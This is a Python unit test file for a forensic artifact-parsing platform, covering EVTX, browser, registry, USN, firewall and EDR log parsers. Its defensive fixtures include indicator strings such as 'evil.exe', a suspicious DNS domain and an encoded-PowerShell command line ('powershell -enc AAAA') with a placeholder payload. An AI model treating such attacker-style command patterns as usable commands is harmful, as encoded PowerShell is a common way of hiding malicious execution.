import os
import sys
import sqlite3
import struct
import tempfile
import importlib
import importlib.util
import inspect
import types
import json
import unittest
from datetime import datetime
from unittest.mock import patch

os.environ.setdefault('SECRET_KEY', 'test-secret')

clickhouse_stub = type(sys)('clickhouse_connect')
clickhouse_stub.get_client = lambda *args, **kwargs: None
sys.modules.setdefault('clickhouse_connect', clickhouse_stub)

base_module = importlib.import_module('parsers.base')
browser_module = importlib.import_module('parsers.browser_parsers')
windows_module = importlib.import_module('parsers.windows_parsers')
log_module = importlib.import_module('parsers.log_parsers')
vendor_module = importlib.import_module('parsers.vendor_parsers')
kape_gap_module = importlib.import_module('parsers.kape_gap_parsers')
catalog_module = importlib.import_module('parsers.catalog')
dissect_module = importlib.import_module('parsers.dissect_parsers')

utils_package = types.ModuleType('utils')
sys.modules.setdefault('utils', utils_package)

clickhouse_spec = importlib.util.spec_from_file_location(
    'utils.clickhouse',
    os.path.join(os.path.dirname(os.path.dirname(__file__)), 'utils', 'clickhouse.py'),
)
clickhouse_module = importlib.util.module_from_spec(clickhouse_spec)
sys.modules['utils.clickhouse'] = clickhouse_module
clickhouse_spec.loader.exec_module(clickhouse_module)
utils_package.clickhouse = clickhouse_module

timezone_spec = importlib.util.spec_from_file_location(
    'utils.timezone',
    os.path.join(os.path.dirname(os.path.dirname(__file__)), 'utils', 'timezone.py'),
)
timezone_module = importlib.util.module_from_spec(timezone_spec)
sys.modules['utils.timezone'] = timezone_module
timezone_spec.loader.exec_module(timezone_module)
utils_package.timezone = timezone_module

archive_extraction_spec = importlib.util.spec_from_file_location(
    'utils.archive_extraction',
    os.path.join(os.path.dirname(os.path.dirname(__file__)), 'utils', 'archive_extraction.py'),
)
archive_extraction_module = importlib.util.module_from_spec(archive_extraction_spec)
sys.modules['utils.archive_extraction'] = archive_extraction_module
archive_extraction_spec.loader.exec_module(archive_extraction_module)
utils_package.archive_extraction = archive_extraction_module

event_dedup_spec = importlib.util.spec_from_file_location(
    'utils.event_deduplication',
    os.path.join(os.path.dirname(os.path.dirname(__file__)), 'utils', 'event_deduplication.py'),
)
event_dedup_module = importlib.util.module_from_spec(event_dedup_spec)
sys.modules['utils.event_deduplication'] = event_dedup_module
event_dedup_spec.loader.exec_module(event_dedup_module)
utils_package.event_deduplication = event_dedup_module

BaseParser = base_module.BaseParser
ParsedEvent = base_module.ParsedEvent
BrowserSQLiteParser = browser_module.BrowserSQLiteParser
ActivitiesCacheParser = windows_module.ActivitiesCacheParser
HuntressParser = log_module.HuntressParser
SonicWallCSVParser = log_module.SonicWallCSVParser
PowerShellHistoryParser = log_module.PowerShellHistoryParser
HostsFileParser = log_module.HostsFileParser
SetupApiLogParser = log_module.SetupApiLogParser
GenericJSONParser = log_module.GenericJSONParser
CSVLogParser = log_module.CSVLogParser
FirewallLogParser = log_module.FirewallLogParser
EvtxECmdParser = importlib.import_module('parsers.evtx_parser').EvtxECmdParser
EvtxFallbackParser = importlib.import_module('parsers.evtx_parser').EvtxFallbackParser
ParserRegistry = importlib.import_module('parsers.registry').ParserRegistry
FileTypeMapping = importlib.import_module('parsers.registry').FileTypeMapping
RegistryParser = dissect_module.RegistryParser
PrefetchParser = dissect_module.PrefetchParser
USNParser = dissect_module.USNParser
get_dedup_config = event_dedup_module.get_dedup_config
SuricataEveParser = vendor_module.SuricataEveParser
DefenderAvParser = vendor_module.DefenderAvParser
MdeXdrParser = vendor_module.MdeXdrParser
PaloAltoParser = vendor_module.PaloAltoParser
PfSenseParser = vendor_module.PfSenseParser
SonicWallSyslogParser = vendor_module.SonicWallSyslogParser
CiscoAsaParser = vendor_module.CiscoAsaParser
VelociraptorParser = vendor_module.VelociraptorParser
RecycleBinParser = kape_gap_module.RecycleBinParser
PayloadTriageParser = kape_gap_module.PayloadTriageParser
KapeLogParser = kape_gap_module.KapeLogParser
DiagnosticLogParser = kape_gap_module.DiagnosticLogParser
NtfsMetadataParser = kape_gap_module.NtfsMetadataParser
WerReportParser = kape_gap_module.WerReportParser
CrashDumpTriageParser = kape_gap_module.CrashDumpTriageParser
WbemRepositoryParser = kape_gap_module.WbemRepositoryParser
BrowserStateParser = kape_gap_module.BrowserStateParser
CloudMetadataParser = kape_gap_module.CloudMetadataParser
TransactionSidecarParser = kape_gap_module.TransactionSidecarParser

try:
    from dissect.ntfs.c_ntfs import c_ntfs
except ImportError:  # pragma: no cover - optional dependency in some test environments
    c_ntfs = None


def _write_usn_record(file_path, *, filename='evil.exe', usn=1234):
    if c_ntfs is None:
        raise unittest.SkipTest('dissect.ntfs is not installed')
    file_reference = c_ntfs.MFT_SEGMENT_REFERENCE()
    file_reference.SegmentNumberLowPart = 10
    file_reference.SegmentNumberHighPart = 0
    file_reference.SequenceNumber = 2

    parent_reference = c_ntfs.MFT_SEGMENT_REFERENCE()
    parent_reference.SegmentNumberLowPart = 5
    parent_reference.SegmentNumberHighPart = 0
    parent_reference.SequenceNumber = 1

    encoded_name = filename.encode('utf-16-le')
    record = c_ntfs.USN_RECORD_V2()
    record.RecordLength = len(c_ntfs.USN_RECORD_V2) + len(encoded_name)
    record.MajorVersion = 2
    record.MinorVersion = 0
    record.FileReferenceNumber = file_reference
    record.ParentFileReferenceNumber = parent_reference
    record.Usn = usn
    record.TimeStamp = 133000000000000000
    record.Reason = c_ntfs.USN_REASON.FILE_CREATE | c_ntfs.USN_REASON.CLOSE
    record.SourceInfo = c_ntfs.USN_SOURCE.NORMAL
    record.SecurityId = 7
    record.FileAttributes = c_ntfs.FILE_ATTRIBUTE.ARCHIVE
    record.FileNameLength = len(encoded_name)
    record.FileNameOffset = len(c_ntfs.USN_RECORD_V2)

    with open(file_path, 'wb') as handle:
        handle.write(bytes(record))
        handle.write(encoded_name)


class _DummyParser(BaseParser):
    @property
    def artifact_type(self):
        return 'dummy'

    def can_parse(self, file_path):
        return True

    def parse(self, file_path):
        if False:
            yield file_path


class _BlankError(Exception):
    def __str__(self):
        return ''


class _FakeClient:
    def __init__(self):
        self.commands = []
        self.fail_buffer = False

    def command(self, sql):
        self.commands.append(sql)
        if self.fail_buffer and 'events_buffer' in sql:
            raise RuntimeError("Table engine Buffer doesn't support mutations")


class _FakeRegistryValueType:
    def __init__(self, name):
        self.name = name


class _FakeRegistryValue:
    def __init__(self, name, value, value_type='REG_SZ'):
        self.name = name
        self.value = value
        self.type = _FakeRegistryValueType(value_type)


class _FakeRegistryKey:
    def __init__(self, path, *, values=None, subkeys=None, timestamp=None):
        self.path = path
        self._values = list(values or [])
        self._subkeys = list(subkeys or [])
        self.timestamp = timestamp or datetime(2024, 1, 1, 12, 0, 0)

    def values(self):
        return list(self._values)

    def subkeys(self):
        return list(self._subkeys)


class _FakeRegistryHive:
    def __init__(self, _handle, *, root, open_map=None):
        self._root = root
        self._open_map = dict(open_map or {})

    def root(self):
        return self._root

    def open(self, path):
        return self._open_map[path]


class ParserHardeningTestCase(unittest.TestCase):
    def _make_registry_parser(self, *, root, extract_all=True, open_map=None):
        parser = object.__new__(RegistryParser)
        BaseParser.__init__(parser, case_id=1, source_host='HOST1', case_file_id=None, case_tz='UTC')
        parser.extract_all = extract_all
        parser._registry_class = lambda fh: _FakeRegistryHive(fh, root=root, open_map=open_map)
        parser.can_parse = lambda _path: True
        return parser

    def test_validate_ip_accepts_ipv6(self):
        parser = _DummyParser(case_id=1)
        self.assertEqual(
            parser.validate_ip('2001:db8::1'),
            '2001:db8::1',
        )

    def test_parsed_event_serializes_parser_emitted_provenance_into_extra_fields(self):
        event = ParsedEvent(
            case_id=1,
            artifact_type='browser_download',
            timestamp=datetime(2026, 4, 1, 10, 0, 0),
            source_host='HOST-1',
            username='alice',
            target_path=r'C:\Users\alice\Downloads\evil.exe',
            search_blob='evil.exe',
            extra_fields='{}',
            parser_version='1.0.0',
        )

        row = event.to_clickhouse_row()
        extra_fields = json.loads(row[-2])

        self.assertEqual(extra_fields['provenance_source'], 'parser_emitted')
        self.assertEqual(extra_fields['field_provenance']['source_host'], 'SYSTEM_DERIVED')
        self.assertEqual(extra_fields['field_provenance']['target_path'], 'ELEVATED_RISK')
        self.assertEqual(extra_fields['emitted_provenance'], 'ELEVATED_RISK')

    def test_parsed_event_marks_utc_metadata_as_system_derived(self):
        event = ParsedEvent(
            case_id=1,
            artifact_type='evtx',
            timestamp=datetime(2026, 4, 1, 10, 0, 0),
            timestamp_source_tz='UTC',
            source_host='HOST-1',
            extra_fields='{}',
            parser_version='1.0.0',
        )

        row = event.to_clickhouse_row()
        extra_fields = json.loads(row[-2])

        self.assertEqual(extra_fields['field_provenance']['timestamp'], 'SYSTEM_DERIVED')
        self.assertEqual(extra_fields['field_provenance']['timestamp_utc'], 'SYSTEM_DERIVED')
        self.assertEqual(extra_fields['field_provenance']['timestamp_source_tz'], 'SYSTEM_DERIVED')

    def test_validate_ipv4_rejects_ipv6(self):
        parser = _DummyParser(case_id=1)
        self.assertIsNone(parser.validate_ipv4('::1'))

    def test_format_exception_falls_back_to_type_name(self):
        parser = _DummyParser(case_id=1)
        self.assertEqual(
            parser.format_exception(_BlankError(), context='Failed to parse'),
            'Failed to parse: _BlankError',
        )

    def test_fallback_timestamp_prefers_file_mtime(self):
        parser = _DummyParser(case_id=1)

        with tempfile.NamedTemporaryFile(delete=False) as handle:
            file_path = handle.name

        try:
            expected = 1700000000
            os.utime(file_path, (expected, expected))
            fallback = parser.fallback_timestamp(file_path=file_path, reason='test fallback')
            self.assertEqual(int(fallback.timestamp()), expected)
            self.assertTrue(any('file_mtime_utc' in warning for warning in parser.warnings))
        finally:
            os.remove(file_path)

    def test_browser_cookie_detection_uses_cookie_columns(self):
        parser = BrowserSQLiteParser(case_id=1)

        with tempfile.NamedTemporaryFile(suffix='.sqlite', delete=False) as handle:
            db_path = handle.name

        try:
            conn = sqlite3.connect(db_path)
            conn.execute(
                'CREATE TABLE cookies (host_key TEXT, name TEXT, path TEXT, value TEXT)'
            )
            conn.commit()
            conn.close()

            self.assertEqual(parser._identify_browser_db(db_path), 'chrome_cookies')
        finally:
            os.remove(db_path)

    def test_activities_cache_handles_missing_activity_table(self):
        parser = ActivitiesCacheParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = os.path.join(tmpdir, 'ActivitiesCache.db')
            conn = sqlite3.connect(db_path)
            conn.execute(
                '''
                CREATE TABLE ActivityOperation (
                    OperationOrder INTEGER,
                    AppId TEXT,
                    ActivityType INTEGER,
                    CreatedTime INTEGER,
                    EndTime INTEGER,
                    LastModifiedTime INTEGER,
                    OperationType TEXT,
                    Payload TEXT,
                    ClipboardPayload TEXT
                )
                '''
            )
            conn.execute(
                '''
                INSERT INTO ActivityOperation (
                    OperationOrder, AppId, ActivityType, CreatedTime, EndTime,
                    LastModifiedTime, OperationType, Payload, ClipboardPayload
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''',
                (1, 'browser.exe', 10, 0, 0, 0, 'copy', '{}', '{}'),
            )
            conn.commit()
            conn.close()

            events = list(parser.parse(db_path))

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'activity_operation')
        self.assertIn('Error querying Activity table', ' '.join(parser.warnings))

    def test_huntress_parser_keeps_elevation_type_out_of_logon_type(self):
        parser = HuntressParser(case_id=1)
        event = {
            '@timestamp': '2026-03-13T10:00:00Z',
            'process': {
                'name': 'cmd.exe',
                'pid': 1234,
                'elevation_type': 'limited',
                'user': {
                    'name': 'alice',
                    'domain': 'CORP',
                    'id': 'S-1-5-21',
                },
            },
            'host': {'hostname': 'HOST1'},
            'event': {'kind': 'event', 'category': 'process'},
        }

        parsed = parser._parse_ecs_event(
            event=event,
            source_file='huntress.ndjson',
            file_path='/tmp/huntress.ndjson',
            default_hostname='HOST1',
            raw_line='{}',
        )

        self.assertIsNotNone(parsed)
        self.assertIsNone(parsed.logon_type)
        self.assertEqual(parsed.elevated_token, 'limited')

    def test_delete_file_events_cleans_buffer_and_main_tables(self):
        client = _FakeClient()

        with patch.object(clickhouse_module, 'get_client', return_value=client):
            clickhouse_module.delete_file_events(99)

        self.assertEqual(
            client.commands,
            [
                'ALTER TABLE events DELETE WHERE case_file_id = 99',
                'ALTER TABLE events_buffer DELETE WHERE case_file_id = 99',
            ],
        )

    def test_delete_file_events_ignores_buffer_mutation_rejection(self):
        client = _FakeClient()
        client.fail_buffer = True

        with patch.object(clickhouse_module, 'get_client', return_value=client):
            clickhouse_module.delete_file_events(55)

        self.assertEqual(
            client.commands,
            [
                'ALTER TABLE events DELETE WHERE case_file_id = 55',
                'ALTER TABLE events_buffer DELETE WHERE case_file_id = 55',
            ],
        )

    def test_evtx_transform_preserves_ipv6_without_populating_src_ip(self):
        parser = object.__new__(EvtxECmdParser)
        BaseParser.__init__(parser, case_id=1, source_host='HOST1', case_file_id=55, case_tz='UTC')

        event = {
            'TimeCreated': '2026-03-14T12:00:00Z',
            'EventId': 4624,
            'Channel': 'Security',
            'Computer': 'HOST1',
            'EventRecordId': '77',
            'Provider': 'Microsoft-Windows-Security-Auditing',
            'Payload': json.dumps({
                'EventData': {
                    'Data': [
                        {'@Name': 'IpAddress', '#text': '::1'},
                        {'@Name': 'TargetUserName', '#text': 'alice'},
                        {'@Name': 'TargetDomainName', '#text': 'CORP'},
                    ]
                }
            }),
        }

        parsed = parser._transform_evtxecmd_event(
            event=event,
            file_path='/tmp/Security.evtx',
            source_file='Security.evtx',
            detections={},
        )

        self.assertIsNotNone(parsed)
        self.assertIsNone(parsed.src_ip)
        self.assertEqual(parsed.remote_host, '::1')
        self.assertIn('::1', parsed.search_blob)
        self.assertEqual(json.loads(parsed.extra_fields)['src_ip_raw'], '::1')

    def test_evtx_fallback_normalizes_eventdata_into_raw_json(self):
        parser = object.__new__(EvtxFallbackParser)
        BaseParser.__init__(parser, case_id=1, source_host='HOST1', case_file_id=56, case_tz='UTC')

        class _FakeEvtx:
            def __init__(self, _file_path):
                pass

            def records_json(self):
                return [{
                    'data': json.dumps({
                        'Event': {
                            'System': {
                                'TimeCreated': {'SystemTime': '2026-03-14T12:00:00Z'},
                                'EventID': {'#text': '4624'},
                                'Channel': 'Security',
                                'Computer': 'HOST1',
                                'EventRecordID': '88',
                                'Provider': {'Name': 'Microsoft-Windows-Security-Auditing'},
                            },
                            'EventData': {
                                'Data': [
                                    {'@Name': 'TargetUserName', '#text': 'alice'},
                                    {'@Name': 'TargetDomainName', '#text': 'CORP'},
                                    {'@Name': 'IpAddress', '#text': '10.0.0.10'},
                                ]
                            },
                        }
                    })
                }]

        parser._parser_class = _FakeEvtx

        with tempfile.NamedTemporaryFile(suffix='.evtx', delete=False) as handle:
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        raw_json = json.loads(events[0].raw_json)
        self.assertEqual(raw_json['EventData']['TargetUserName'], 'alice')
        self.assertEqual(raw_json['EventData']['TargetDomainName'], 'CORP')
        self.assertEqual(raw_json['EventData']['IpAddress'], '10.0.0.10')
        self.assertEqual(events[0].src_ip, '10.0.0.10')

    def test_evtx_fallback_preserves_ipv6_without_populating_src_ip(self):
        parser = object.__new__(EvtxFallbackParser)
        BaseParser.__init__(parser, case_id=1, source_host='HOST1', case_file_id=57, case_tz='UTC')

        class _FakeEvtx:
            def __init__(self, _file_path):
                pass

            def records_json(self):
                return [{
                    'data': json.dumps({
                        'Event': {
                            'System': {
                                'TimeCreated': {'SystemTime': '2026-03-14T12:00:00Z'},
                                'EventID': {'#text': '4624'},
                                'Channel': 'Security',
                                'Computer': 'HOST1',
                                'EventRecordID': '89',
                                'Provider': {'Name': 'Microsoft-Windows-Security-Auditing'},
                            },
                            'EventData': {
                                'Data': [
                                    {'@Name': 'TargetUserName', '#text': 'alice'},
                                    {'@Name': 'IpAddress', '#text': '2001:db8::10'},
                                ]
                            },
                        }
                    })
                }]

        parser._parser_class = _FakeEvtx

        with tempfile.NamedTemporaryFile(suffix='.evtx', delete=False) as handle:
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertIsNone(events[0].src_ip)
        self.assertIn('2001:db8::10', events[0].search_blob)
        self.assertEqual(json.loads(events[0].extra_fields)['src_ip_raw'], '2001:db8::10')

    def test_evtxecmd_preserves_all_hayabusa_detections_for_one_record(self):
        parser = object.__new__(EvtxECmdParser)
        BaseParser.__init__(parser, case_id=1, source_host='HOST1', case_file_id=58, case_tz='UTC')

        event = {
            'TimeCreated': '2026-03-14T12:00:00Z',
            'EventId': '4624',
            'Channel': 'Security',
            'Computer': 'HOST1',
            'EventRecordId': '88',
            'Provider': 'Microsoft-Windows-Security-Auditing',
            'Payload': json.dumps({
                'EventData': {
                    'Data': [
                        {'@Name': 'TargetUserName', '#text': 'alice'},
                        {'@Name': 'IpAddress', '#text': '10.0.0.10'},
                    ]
                }
            }),
        }
        detections = {
            '88': [
                {
                    'rule_title': 'Rule One',
                    'rule_level': 'high',
                    'rule_file': 'one.yml',
                    'mitre_tactics': ['Credential Access'],
                    'mitre_tags': ['T1110'],
                },
                {
                    'rule_title': 'Rule Two',
                    'rule_level': 'med',
                    'rule_file': 'two.yml',
                    'mitre_tactics': ['Lateral Movement'],
                    'mitre_tags': ['T1021'],
                },
            ]
        }

        parsed = parser._transform_evtxecmd_event(
            event,
            '/tmp/Security.evtx',
            'Security.evtx',
            detections,
        )

        self.assertEqual(parsed.rule_title, 'Rule One | Rule Two')
        self.assertEqual(parsed.rule_level, 'high | med')
        self.assertEqual(parsed.rule_file, 'one.yml | two.yml')
        self.assertEqual(parsed.mitre_tactics, ['Credential Access', 'Lateral Movement'])
        self.assertEqual(parsed.mitre_tags, ['T1021', 'T1110'])
        self.assertEqual(
            len(json.loads(parsed.extra_fields)['hayabusa_detections']),
            2,
        )

    def test_sonicwall_row_preserves_ipv6_without_populating_ip_columns(self):
        parser = object.__new__(SonicWallCSVParser)
        BaseParser.__init__(parser, case_id=1, source_host='sonicwall', case_file_id=99, case_tz='UTC')

        row = {
            'Time': '10/30/2025 14:29:36',
            'ID': '1257',
            'Category': 'Network',
            'Group': 'ICMP',
            'Event': 'ICMPv6 Packets Dropped',
            'Msg. Type': 'Standard Policy',
            'Priority': 'Information',
            'Src. IP': 'fe80::b28b:d0ff:fe3f:9819',
            'Dst. IP': 'ff02::16',
            'Src.NAT IP': '2001:db8::10',
            'Dst.NAT IP': '2001:db8::20',
            'IP Protocol': 'ipv6-icmp',
            'FW Action': 'drop',
            'Message': 'ICMPv6 packet dropped due to policy',
        }

        parsed = parser._parse_row(
            row=row,
            source_file='log.csv',
            file_path='/tmp/log.csv',
            hostname='sonicwall',
        )

        self.assertIsNotNone(parsed)
        self.assertIsNone(parsed.src_ip)
        self.assertIsNone(parsed.dst_ip)
        self.assertIn('src_ip:fe80::b28b:d0ff:fe3f:9819', parsed.search_blob)
        self.assertIn('dst_ip:ff02::16', parsed.search_blob)
        self.assertIn('src_nat_ip:2001:db8::10', parsed.search_blob)
        self.assertIn('dst_nat_ip:2001:db8::20', parsed.search_blob)
        extra = json.loads(parsed.extra_fields)
        self.assertEqual(extra['src_ip_raw'], 'fe80::b28b:d0ff:fe3f:9819')
        self.assertEqual(extra['dst_ip_raw'], 'ff02::16')
        self.assertEqual(extra['src_nat_ip'], '2001:db8::10')
        self.assertEqual(extra['dst_nat_ip'], '2001:db8::20')

    def test_registry_falls_back_to_generic_json_when_firefox_json_rejects(self):
        registry = ParserRegistry()

        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, 'RecommendationsFilterList.json')
            with open(file_path, 'w', encoding='utf-8') as handle:
                json.dump([{'name': 'entry', 'value': 1}], handle)

            artifact_type, parser = registry.resolve_parser_for_file(
                file_path=file_path,
                case_id=1,
            )

        self.assertEqual(artifact_type, 'json_log')
        self.assertIsNotNone(parser)
        self.assertEqual(parser.artifact_type, 'json_log')

    def test_registry_prefers_firefox_json_for_profile_artifacts(self):
        registry = ParserRegistry()

        with tempfile.TemporaryDirectory() as tmpdir:
            profile_dir = os.path.join(tmpdir, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles', 'abcd.default-release')
            os.makedirs(profile_dir, exist_ok=True)
            file_path = os.path.join(profile_dir, 'handlers.json')
            with open(file_path, 'w', encoding='utf-8') as handle:
                json.dump({'schemes': {}, 'mimeTypes': {}}, handle)

            artifact_type, parser = registry.resolve_parser_for_file(
                file_path=file_path,
                case_id=1,
            )

        self.assertEqual(artifact_type, 'firefox_json')
        self.assertIsNotNone(parser)
        self.assertEqual(parser.artifact_type, 'firefox_json')

    def test_registry_preserves_kape_support_files_without_parser(self):
        registry = ParserRegistry()

        with tempfile.TemporaryDirectory() as tmpdir:
            for relative_path in (
                os.path.join('kape', 'KAPE', 'Modules', 'Windows', 'PowerShell_Defender_Exclusions.mkape'),
                os.path.join('kape', 'KAPE', 'Targets', 'Antivirus', 'WindowsDefender.tkape'),
                os.path.join('kape', 'KAPE', 'Modules', 'bin', 'EvtxECmd', 'Maps', 'SentinelOne-Operational_91.map'),
                os.path.join('kape', 'KAPE', 'Modules', 'bin', 'SQLECmd', 'Maps', 'Windows_Bitdefender_cache.smap'),
            ):
                file_path = os.path.join(tmpdir, relative_path)
                os.makedirs(os.path.dirname(file_path), exist_ok=True)
                with open(file_path, 'w', encoding='utf-8') as handle:
                    handle.write('Name: support file\n')

                artifact_type, parser = registry.resolve_parser_for_file(
                    file_path=file_path,
                    case_id=1,
                )

                self.assertIsNone(artifact_type)
                self.assertIsNone(parser)

    def test_registry_lists_parser_capabilities_with_vendor_entries(self):
        registry = ParserRegistry()

        capabilities = registry.list_parser_capabilities()
        by_key = {row['parser_key']: row for row in capabilities}

        self.assertIn('mde_xdr', by_key)
        self.assertIn('usn', by_key)
        self.assertEqual(by_key['mde_xdr']['default_hunt_tab'], 'events')
        self.assertEqual(by_key['usn']['default_hunt_tab'], 'filesystem')
        self.assertEqual(by_key['palo_alto']['storage_model'], 'events')
        self.assertIn('sonicwall_syslog', by_key)

    def test_catalog_exposes_curated_upload_type_rows(self):
        rows = catalog_module.get_upload_type_rows()
        by_key = {row['key']: row for row in rows}

        self.assertIn(catalog_module.AUTO_DETECT_UPLOAD_KEY, by_key)
        self.assertIn(catalog_module.CYLR_UPLOAD_KEY, by_key)
        self.assertIn(catalog_module.KAPE_UPLOAD_KEY, by_key)
        self.assertEqual(by_key[catalog_module.KAPE_UPLOAD_KEY]['label'], catalog_module.KAPE_UPLOAD_LABEL)
        self.assertTrue(by_key[catalog_module.KAPE_UPLOAD_KEY]['is_archive'])
        self.assertIn('mde_xdr', by_key)
        self.assertTrue(by_key['sonicwall']['parser_hints'])
        self.assertEqual(by_key['huntress']['label'], 'Huntress EDR')

    def test_webcache_catalog_lists_all_emitted_artifact_types(self):
        webcache_types = catalog_module.PARSER_CAPABILITIES_BY_KEY['webcache'].artifact_types
        browser_tab_types = catalog_module.HUNTING_TAB_TYPES['browsers']

        self.assertIn('webcache_dom_storage', webcache_types)
        self.assertIn('webcache_compatibility', webcache_types)
        self.assertIn('webcache_dom_storage', browser_tab_types)
        self.assertIn('webcache_compatibility', browser_tab_types)

    def test_browser_catalog_lists_firefox_storage_sqlite_types(self):
        browser_types = catalog_module.PARSER_CAPABILITIES_BY_KEY['browser'].artifact_types
        browser_tab_types = catalog_module.HUNTING_TAB_TYPES['browsers']

        self.assertIn('sqlite_firefox_origin_storage', browser_types)
        self.assertIn('sqlite_firefox_cache_storage', browser_types)
        self.assertIn('sqlite_firefox_indexeddb', browser_types)
        self.assertIn('sqlite_firefox_origin_storage', browser_tab_types)
        self.assertIn('sqlite_firefox_cache_storage', browser_tab_types)
        self.assertIn('sqlite_firefox_indexeddb', browser_tab_types)

    def test_catalog_normalizes_legacy_upload_labels(self):
        resolved = catalog_module.resolve_upload_type_selection('Huntress NDJSON')

        self.assertEqual(resolved['label'], 'Huntress EDR')
        self.assertEqual(resolved['parser_hints'][0], 'huntress')

    def test_registry_prefers_hint_candidates_before_detected_candidates(self):
        call_order = []

        class _HintParser(BaseParser):
            @property
            def artifact_type(self):
                return 'hint'

            def can_parse(self, _file_path):
                call_order.append('hint')
                return False

            def parse(self, _file_path):
                if False:
                    yield _file_path

        class _DetectedParser(BaseParser):
            @property
            def artifact_type(self):
                return 'detected'

            def can_parse(self, _file_path):
                call_order.append('detected')
                return True

            def parse(self, _file_path):
                if False:
                    yield _file_path

        registry = ParserRegistry()
        registry._parsers = {}
        registry.register(FileTypeMapping('hint', _HintParser))
        registry.register(FileTypeMapping('detected', _DetectedParser))

        with tempfile.NamedTemporaryFile(delete=False) as handle:
            file_path = handle.name

        try:
            with patch.object(registry, '_collect_candidates', return_value=[(50, 10, 'detected')]):
                artifact_type, parser = registry.resolve_parser_for_file(
                    file_path=file_path,
                    case_id=1,
                    parser_hints=['hint'],
                )
        finally:
            os.remove(file_path)

        self.assertEqual(call_order, ['hint', 'detected'])
        self.assertEqual(artifact_type, 'detected')
        self.assertIsNotNone(parser)

    def test_catalog_event_filter_groups_include_new_vendors(self):
        self.assertIn('suricata', catalog_module.EVENT_FILTER_GROUPS['firewall'])
        self.assertIn('mde_xdr', catalog_module.EVENT_FILTER_GROUPS['edr'])
        self.assertIn('defender_av', catalog_module.HUNTING_TAB_TYPES['events'])

    def test_suricata_eve_parser_maps_alert_fields(self):
        parser = SuricataEveParser(case_id=1)

        with tempfile.NamedTemporaryFile('w', suffix='.jsonl', delete=False) as handle:
            handle.write(json.dumps({
                'timestamp': '2026-03-20T10:00:00.000000+0000',
                'event_type': 'alert',
                'src_ip': '10.10.10.5',
                'src_port': 44444,
                'dest_ip': '8.8.8.8',
                'dest_port': 53,
                'proto': 'UDP',
                'flow_id': 12345,
                'alert': {
                    'signature': 'ET DNS Query for Suspicious Domain',
                    'category': 'Potentially Bad Traffic',
                    'severity': 2,
                },
                'dns': {'rrname': 'bad.example'},
            }) + '\n')
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'suricata')
        self.assertEqual(events[0].rule_title, 'ET DNS Query for Suspicious Domain')
        self.assertEqual(events[0].target_path, 'bad.example')
        self.assertEqual(json.loads(events[0].extra_fields)['flow_id'], 12345)

    def test_mde_xdr_rejects_jump_list_files(self):
        parser = MdeXdrParser(case_id=1)
        with tempfile.NamedTemporaryFile(suffix='.customdestinations-ms', delete=False) as handle:
            handle.write(b'not-json-ole-stub' * 8)
            file_path = handle.name
        try:
            self.assertFalse(parser.can_parse(file_path))
        finally:
            os.remove(file_path)

    def test_registry_ranks_jumplist_above_mde_for_custom_destinations(self):
        """Candidate ordering must favor jumplist when dissect is unavailable in CI."""
        registry = ParserRegistry()
        with tempfile.NamedTemporaryFile(suffix='.customdestinations-ms', delete=False) as handle:
            handle.write(b'DATA\x00\x01\x02' * 32)
            file_path = handle.name
        try:
            candidates = registry._collect_candidates(file_path)
            ordered = [c[2] for c in candidates]
            self.assertTrue(ordered, 'expected at least one parser candidate')
            self.assertEqual(ordered[0], 'jumplist')
            if 'mde_xdr' in ordered:
                self.assertLess(ordered.index('jumplist'), ordered.index('mde_xdr'))
        finally:
            os.remove(file_path)

    def test_sonicwall_syslog_rejects_pkcs_style_noise(self):
        parser = SonicWallSyslogParser(case_id=1)
        with tempfile.NamedTemporaryFile('w', suffix='.txt', delete=False, encoding='utf-8') as handle:
            handle.write('library= name=NSS id=9f5e994a sn=CK_xx\n')
            file_path = handle.name
        try:
            self.assertFalse(parser.can_parse(file_path))
        finally:
            os.remove(file_path)

    def test_velociraptor_rejects_firefox_telemetry_style_json(self):
        parser = VelociraptorParser(case_id=1)
        with tempfile.NamedTemporaryFile('w', suffix='.json', delete=False, encoding='utf-8') as handle:
            json.dump({'telemetryClientId': 'abc-123', 'flowId': 'session'}, handle)
            file_path = handle.name
        try:
            self.assertFalse(parser.can_parse(file_path))
        finally:
            os.remove(file_path)

    def test_suricata_eve_basename_avoids_steve_false_positive(self):
        parser = SuricataEveParser(case_id=1)
        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, 'steve.json')
            with open(file_path, 'w', encoding='utf-8') as handle:
                handle.write('{}\n')
            self.assertFalse(parser.can_parse(file_path))

    def test_firefox_state_json_emits_no_events_in_profile(self):
        parser = browser_module.FirefoxJSONParser(case_id=1)
        with tempfile.TemporaryDirectory() as tmpdir:
            profile_dir = os.path.join(
                tmpdir, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles', 'abcd.default-release'
            )
            os.makedirs(profile_dir, exist_ok=True)
            file_path = os.path.join(profile_dir, 'state.json')
            with open(file_path, 'w', encoding='utf-8') as handle:
                json.dump({'telemetry': {'clientID': 'x'}}, handle)
            events = list(parser.parse(file_path))
        self.assertEqual(events, [])
        self.assertEqual(parser.errors, [])

    def test_mde_xdr_parser_maps_common_hunting_fields(self):
        parser = MdeXdrParser(case_id=1)

        with tempfile.NamedTemporaryFile('w', suffix='.csv', delete=False) as handle:
            handle.write(
                'Timestamp,DeviceName,ActionType,AccountName,FileName,ProcessCommandLine,RemoteIP,RemotePort,SHA256,FolderPath,ReportId\n'
                '2026-03-20T10:00:00Z,HOST1,ConnectionSuccess,alice,powershell.exe,"powershell -enc AAAA",8.8.8.8,443,abc123,C:\\\\Temp\\\\evil.bin,42\n'
            )
            file_path = handle.name

        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'mde_xdr')
        self.assertEqual(events[0].source_host, 'HOST1')
        self.assertEqual(events[0].process_name, 'powershell.exe')
